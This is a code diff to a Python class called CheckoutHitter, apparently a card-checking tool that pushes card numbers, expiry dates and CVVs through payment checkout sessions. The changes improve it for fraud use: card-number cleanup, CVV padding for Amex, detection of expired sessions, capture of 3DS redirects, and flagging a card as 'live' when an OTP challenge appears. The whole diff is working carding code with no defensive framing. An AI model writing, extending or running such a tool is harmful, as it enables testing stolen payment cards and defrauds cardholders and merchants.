@@ -70,11 +70,18 @@ class CheckoutHitter:
                             if isinstance(merchant_info, dict) and merchant_info.get('name'):
                                 self.merchant_name = merchant_info['name']
                                 
-                            # Amount & Currency
+                            # Amount & Currency (Safe decimal handling)
                             amount = context.get('amount')
-                            currency = context.get('currency', 'USD')
+                            currency = (context.get('currency') or 'USD').upper()
                             if amount is not None:
-                                self.amount_str = f"{currency} {amount/100:.2f}"
+                                ZERO_DECIMAL = {'JPY', 'KRW', 'VND', 'BIF', 'CLP', 'DJF', 'GNF', 'ISK', 'KMF', 'PYG', 'RWF', 'UGX', 'VUV'}
+                                THREE_DECIMAL = {'BHD', 'JOD', 'KWD', 'OMR', 'TND'}
+                                if currency in ZERO_DECIMAL:
+                                    self.amount_str = f"{currency} {amount}"
+                                elif currency in THREE_DECIMAL:
+                                    self.amount_str = f"{currency} {amount/1000:.3f}"
+                                else:
+                                    self.amount_str = f"{currency} {amount/100:.2f}"
                                 
                             # Payment Session ID
                             ps_info = context.get('payment_session', {})
@@ -128,13 +135,19 @@ class CheckoutHitter:
         
         yr = int(card_obj['year'])
         yr_full = yr + 2000 if yr < 100 else yr
+        card_num = str(card_obj['card']).replace(" ", "").replace("-", "")
+        cvv_raw = str(card_obj.get('cvv', '000')).strip()
+        
+        # Amex CVV validation / padding
+        if card_num.startswith(('34', '37')) and len(cvv_raw) == 3:
+            cvv_raw = f"{cvv_raw}0"
         
         payload = {
             "type": "card",
-            "number": str(card_obj['card']),
+            "number": card_num,
             "expiry_month": int(card_obj['month']),
             "expiry_year": yr_full,
-            "cvv": str(card_obj['cvv'])
+            "cvv": cvv_raw
         }
         
         try:
@@ -230,18 +243,27 @@ class CheckoutHitter:
                             result['success'] = True
                         elif status == 'Pending' and '_links' in pay_data and 'redirect' in pay_data['_links']:
                             redir_url = pay_data['_links']['redirect']['href']
+                            result['redirect_url'] = redir_url
                             result = await self._handle_3ds(session, redir_url, result)
                         else:
                             result['decline_code'] = pay_data.get('response_code') or status
                             result['error'] = pay_data.get('response_summary') or pay_data.get('status') or f"Status: {status}"
                     else:
-                        err_desc = pay_data.get('response_summary')
-                        if not err_desc or err_desc == "validation_error":
+                        err_desc = pay_data.get('response_summary') or pay_data.get('error_type') or ''
+                        err_low = err_desc.lower()
+                        if 'already' in err_low or 'consumed' in err_low or 'closed' in err_low or 'expired' in err_low:
+                            result['session_expired'] = True
+                            result['decline_code'] = 'link_expired'
+                            result['error'] = '[!] Session Expired'
+                        elif not err_desc or err_desc == "validation_error":
                             err_desc = "The payment was unsuccessful, please check the details or try another payment method."
-                        elif isinstance(pay_data.get('error_codes'), list):
-                            err_desc += f" ({', '.join(pay_data['error_codes'])})"
-                        result['decline_code'] = pay_data.get('response_summary') or str(r.status_code)
-                        result['error'] = err_desc
+                            result['decline_code'] = str(r.status_code)
+                            result['error'] = err_desc
+                        else:
+                            if isinstance(pay_data.get('error_codes'), list):
+                                err_desc += f" ({', '.join(pay_data['error_codes'])})"
+                            result['decline_code'] = pay_data.get('response_summary') or str(r.status_code)
+                            result['error'] = err_desc
                         
         except Exception as e:
             result['error'] = f"Engine error: {str(e)}"
@@ -251,6 +273,7 @@ class CheckoutHitter:
 
     async def _handle_3ds(self, session: ChromeSession, redirect_url: str, result: dict) -> dict:
         """Standard ACS redirect follow & completion."""
+        result['redirect_url'] = redirect_url
         try:
             async with session.get(redirect_url, headers={"User-Agent": UA}, allow_redirects=True, timeout=12) as r:
                 html = r.text() if callable(r.text) else r.text
@@ -265,8 +288,9 @@ class CheckoutHitter:
                 form_data[m.group(1)] = m.group(2)
                 
             if not acs_url or not form_data:
-                result['error'] = "3DS Challenge Required (Hard OTP)"
+                result['error'] = "3DS Authentication Required (Hard OTP)"
                 result['decline_code'] = "requires_action"
+                result['is_live'] = True
                 return result
                 
             async with session.post(
